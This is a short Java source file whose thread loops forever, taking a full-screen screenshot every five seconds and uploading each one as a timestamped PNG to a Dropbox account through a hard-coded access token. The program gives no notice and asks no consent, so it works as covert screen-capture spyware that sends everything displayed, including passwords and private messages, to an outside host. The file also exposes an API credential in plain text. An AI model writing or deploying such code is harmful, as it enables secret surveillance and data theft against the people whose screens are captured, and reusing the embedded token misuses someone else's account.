import com.dropbox.core.DbxRequestConfig;
import com.dropbox.core.v2.DbxClientV2;
import javax.imageio.ImageIO;
import java.awt.*;
import java.awt.image.BufferedImage;
import java.io.*;
import java.text.SimpleDateFormat;
import java.util.Date;

public class MyThread extends Thread {
    public BufferedImage image;
    public DbxClientV2 client;
    @Override
    public void run() {

        String ACCESS_TOKEN = "ymOhpKByt5AAAAAAAAAAVz5fApILIfc7eJ67ket7jtxRcEcECSPkWDzIq1g0GRUF";
        DbxRequestConfig config = DbxRequestConfig.newBuilder("dropbox/java-tutorial").build();
        DbxClientV2 client = new DbxClientV2(config, ACCESS_TOKEN);


        for (; ; ) {
            BufferedImage image = null;
            try {
                Robot robot = new Robot();
                Rectangle screenRect = new Rectangle(Toolkit.getDefaultToolkit().getScreenSize());
                image = robot.createScreenCapture(screenRect);
                ByteArrayOutputStream os = new ByteArrayOutputStream();

                SimpleDateFormat format = new SimpleDateFormat("yyyyMMdd_HHmmss");
                String date = format.format(new Date());

                ImageIO.write(image, "png", os);
                byte[] bytes = os.toByteArray();
                InputStream is = new ByteArrayInputStream(bytes);

                client.files().uploadBuilder("/" + date + ".png")
                        .uploadAndFinish(is);

            } catch (Exception e) {
                e.printStackTrace();
            }
            try {
                sleep(5000);
            } catch (Exception e) {
                e.printStackTrace();
            }

        }
    }
}
